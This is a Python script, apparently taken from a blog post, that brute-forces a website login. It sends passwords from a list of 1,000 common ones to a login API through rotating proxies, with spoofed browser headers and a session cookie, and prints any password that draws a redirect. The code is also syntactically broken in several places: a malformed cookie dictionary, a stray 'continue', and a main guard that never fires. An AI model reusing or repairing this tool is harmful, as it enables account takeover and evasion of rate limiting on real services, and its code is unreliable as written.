### IP rotation login - source : https://shivangx01b.github.io/ip-rotation/

from proxy_requests.proxy_requests import ProxyRequests
import Queue
import sys

q = Queue.Queue()

passwordList = open('1k_most_common.txt','r').read().splitlines()
total = len(passwordList)


def attack(url):
   try :
       Pass = q.get()
       r = ProxyRequests(url)
       r.set_headers({"Connection": "close", 
                      "Accept": "application/json, text/plain, */*", 
                      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36", 
                      "Content-Type": "application/json;charset=UTF-8", 
                      "Origin": "https://private.com", 
                      "Sec-Fetch-Site": "same-site", 
                      "Sec-Fetch-Mode": "cors", 
                      "Sec-Fetch-Dest": "empty", 
                      "Referer": "https://private.com/login", 
                      " Accept-Encoding": "gzip, deflate", 
                      "Accept-Language": "en-US,en;q=0.9",
                      "Cookie " : "__cfduid": "dc7914404b4b8af17d2b615325ec94cbf1596976181", "connect.sid": "s%3Aqcg54CJ2isBko1u1YNhaPG0bhX9R9Wmi.8XeOBqwBtDjReQFjOwpK8s6AnRPVO4BJfghJClZEcio"}

       r.post_with_headers({"email": "anyuser@gmail.com", "password": "" + str(Pass) + "", "recaptchaToken": "03AGdBq27wZv0tXXXXXXXXXXXXXX", "recaptchaVersion": "v3"})

       if r.get_status_code() == 401 or r.get_status_code() == 429:
                     continue
       if r.get_status_code() == 302:
                     print ("[!] Password Found !: " + str(Pass))
    except Queue.Empty :
	sys.exit()
   
def push_pass():

   for password in passwordList :
        q.put(password.strip())

def main():
   push_pass()
   url = "https://api.private.com/api/v2/login"
   for i in range(total):
       attack(url)
        

if '__name__' == '__main__': 
    main()
